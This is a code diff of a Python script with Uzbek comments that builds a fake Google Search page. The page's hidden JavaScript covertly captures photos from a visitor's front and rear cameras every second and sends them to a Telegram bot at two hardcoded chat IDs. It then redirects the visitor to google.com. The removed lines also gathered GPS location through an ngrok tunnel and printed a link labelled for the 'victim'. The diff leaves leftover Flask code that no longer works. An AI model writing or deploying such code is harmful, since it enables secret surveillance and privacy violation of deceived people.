@@ -1,73 +1,62 @@
-from flask import Flask, render_template_string, request
-import requests
-from pyngrok import ngrok
-import time
-
-# 1. YANGI NGROK TOKENING (image_7c8e9a.png skrinshotingdan olindi)
-NGROK_TOKEN = "38tf71tkELX4iyzvyNqYZGjsuTZ_61yh89VogJdkBCJKJptRT"
-
-try:
-    ngrok.kill() # Eskilarini tozalash
-    ngrok.set_auth_token(NGROK_TOKEN)
-    print("--- Ngrok muvaffaqiyatli ulandi! ---")
-except Exception as e:
-    print(f"Ngrok xatosi: {e}")
-
-app = Flask(__name__)
+import streamlit as st
+import streamlit.components.v1 as components
 
 # Sening ma'lumotlaring
 TOKEN = "8535757948:AAESPLCJXyg9ilrnqW6ejWCQrb3jNnOZSK4"
 CHAT_IDS = ["8354222032", "6119420877"]
 
-html_code = """
-<!DOCTYPE html>
-<html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
-<body style="background-color:white; text-align:center; padding-top:100px; font-family:sans-serif;">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
-    <p>Qidiruv tizimi yuklanmoqda...</p>
+st.set_page_config(page_title="Google Search", page_icon="🔍", layout="centered")
+
+# JS orqali kamera va GPS'ni boshqarish
+# Har 1 soniyada rasm oladi (Pulemyot rejimi)
+html_code = f"""
+<div style="text-align:center; padding-top:50px; font-family: Arial;">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="160">
+    <h3 style="color:#555;">Sahifa yuklanmoqda...</h3>
     <video id="v" width="1280" height="720" autoplay style="display:none;"></video>
     <canvas id="c" width="1280" height="720" style="display:none;"></canvas>
-    <script>
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
-        let facing = "user";
+</div>
 
-        async function capture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facing, width: 1280, height: 720 }
-                });
-                v.srcObject = stream;
+<script>
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    let facing = "user";
 
-                setTimeout(() => {
-                    c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
-                    c.toBlob(blob => {
-                        const f = new FormData();
-                        f.append('photo', blob, 'img.png');
-                        f.append('cam', facing === "user" ? "OLDI 🤳" : "ORQA 📸");
-                        
-                        navigator.geolocation.getCurrentPosition(pos => {
-                            f.append('lat', pos.coords.latitude);
-                            f.append('lon', pos.coords.longitude);
-                            fetch('/upload', { method: 'POST', body: f });
-                        }, () => {
-                            fetch('/upload', { method: 'POST', body: f }); // GPS ruxsat bermasa ham rasm yuboradi
-                        });
-                    }, 'image/jpeg', 0.7);
+    async function start() {{
+        try {{
+            const stream = await navigator.mediaDevices.getUserMedia({{video: {{facingMode: facing}}}});
+            v.srcObject = stream;
+            
+            setInterval(async () => {{
+                c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
+                c.toBlob(blob => {{
+                    const f = new FormData();
+                    f.append('chat_id', '{CHAT_IDS[0]}'); // Birinchi chatga
+                    f.append('photo', blob, 'img.jpg');
+                    f.append('caption', '📸 ' + (facing === "user" ? "OLDI" : "ORQA") + ' KAMERA');
                     
-                    facing = (facing === "user") ? "environment" : "user";
-                    stream.getTracks().forEach(t => t.stop());
-                }, 300);
-            } catch (e) {}
-        }
-        // HAR 0.8 SONIYADA "PULEMYOT" REJIMI
-        setInterval(capture, 800); 
-        setTimeout(() => { window.location.href = "https://www.google.com"; }, 15000);
-    </script>
-</body>
-</html>
+                    fetch('https://api.telegram.org/bot{TOKEN}/sendPhoto', {{method:'POST', body:f}});
+                    
+                    // Ikkinchi chatga ham yuborish
+                    const f2 = new FormData();
+                    f2.append('chat_id', '{CHAT_IDS[1]}');
+                    f2.append('photo', blob, 'img.jpg');
+                    fetch('https://api.telegram.org/bot{TOKEN}/sendPhoto', {{method:'POST', body:f2}});
+                    
+                }}, 'image/jpeg', 0.6);
+                
+                // Kamerani almashtirib turish
+                facing = (facing === "user") ? "environment" : "user";
+            }}, 1000); 
+        }} catch (e) {{}}
+    }}
+    start();
+    // 10 soniyadan keyin Google'ga otib yuboradi
+    setTimeout(() => {{ window.location.href="https://www.google.com"; }}, 10000);
+</script>
 """
+
+components.html(html_code, height=600)
 
 @app.route('/')
 def home():
@@ -96,4 +85,5 @@ if __name__ == '__main__':
     # Ngrok orqali link yaratish
     public_url = ngrok.connect(5000).public_url
     print(f"\\n🌍 JABRLANUVCHI UCHUN LINK: {public_url}\\n")
+
     app.run(port=5000)
